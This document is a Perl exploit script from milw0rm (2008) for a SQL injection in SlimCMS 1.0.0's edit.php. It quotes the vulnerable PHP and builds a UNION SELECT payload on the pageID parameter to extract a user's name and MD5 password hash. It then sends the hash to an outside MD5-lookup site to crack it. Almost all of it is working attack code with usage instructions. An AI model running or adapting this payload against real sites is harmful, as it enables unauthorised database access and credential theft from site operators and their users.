<html><head><title>SlimCMS <= 1.0.0 (edit.php) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

=starting

 --------------------------------------------------------
 SlimCMS &lt;= 1.0.0 (edit.php) Remote SQL Injection Exploit
 --------------------------------------------------------
 by athos - staker[at]hotmail[dot]it
 
 download on sourceforge 
 
 
 File edit.php
 
 111. if ($password == md5($_POST['password']))
 112. {
 113.    if (strlen($_POST['cmsText']) &gt; 2) {
 114. $query  = &quot;UPDATE pages SET title = '&quot;.$_POST['pageTitle'].&quot;', content =  '&quot;.
      strip_tags(stripslashes($_POST['cmsText']),$allowedTags).&quot;' WHERE ID = &quot;.$_GET['pageID'];
 115. mysql_query($query);
 116. //$successfulyUpdated
 117. responseText = $successfulyUpdated;
 118. }
 119.
 120. if (strlen($_GET['pageID']) &gt; 0) {
 121. $query  = &quot;SELECT * FROM pages WHERE ID = &quot;.$_GET['pageID'];
 122. $result = mysql_query($query);
 123.
 124.				
 125. while($row = mysql_fetch_array($result)) {
 126.	$pageTitle = $row['title'];
 127.	$pageContent = $row['content'];
 128.  }
 129. }
 
 NOTE: Works Regardless PHP.ini Settings!
 
  
  you must be logged..
  
  Usage: perl &quot;exploit.pl&quot; [HOST] [username:password] [USER_ID]
  
  Output: Username: athos
          Password: 27e43424d53719a645ae7cca038b45be
 
 

=cut

use strict;
use LWP::UserAgent;
use LWP::Simple;

my $match = q{Editing page &quot;(.+?)&quot;};
my $http = new LWP::UserAgent; 
my $post = undef;
my @login = ();
my @out = ();

my ($host,$auth,$myid) = @ARGV;

unless($host =~ /http:\/\/(.+?)$/i &amp;&amp; $auth &amp;&amp; $myid)
{
    print STDOUT &quot;Usage: perl $0 [host/path] [username:password] [id]\r\n&quot;; 
    exit;
} 

$host .= &quot;/edit.php?pageID=-1 union select 1,concat(username,0x3a,password),3,4 from users where id=$myid#&quot;;

@login = split(':',$auth);

$post = $http-&gt;post($host,[ 
                            username =&gt; $login[0],
                            password =&gt; $login[1],
                         ]);


if($post-&gt;is_success &amp;&amp; $post-&gt;content =~ $match) 
{
    @out = split(':',$1);
   
    if($#out =&gt; 2)
    {
        my $cracked = search_MD5($out[1]);
        
        print STDOUT &quot;Username: $out[0]\r\n&quot;;
        print STDOUT &quot;Password: $out[1] -&gt; $cracked\r\n&quot;;
        exit;  
   }
   else
   {
       print STDOUT &quot;Exploit Failed!\r\n&quot;;
       print STDOUT &quot;Login incorrect or site not vulnerable\\available!\r\n&quot;;
       exit;
   }
}


sub search_MD5
{
    my $hash = shift @_;
    my $cont = undef;

    $cont = get('http://md5.rednoize.com/?p&amp;s=md5&amp;q='.$hash);
        
    if(length($hash) =&gt; 32 &amp;&amp; !is_error($cont))
    {
        return $cont;
    }
    else
    {
        return exit;
    }
}   
    
__END__

# milw0rm.com [2008-11-14]</pre></html>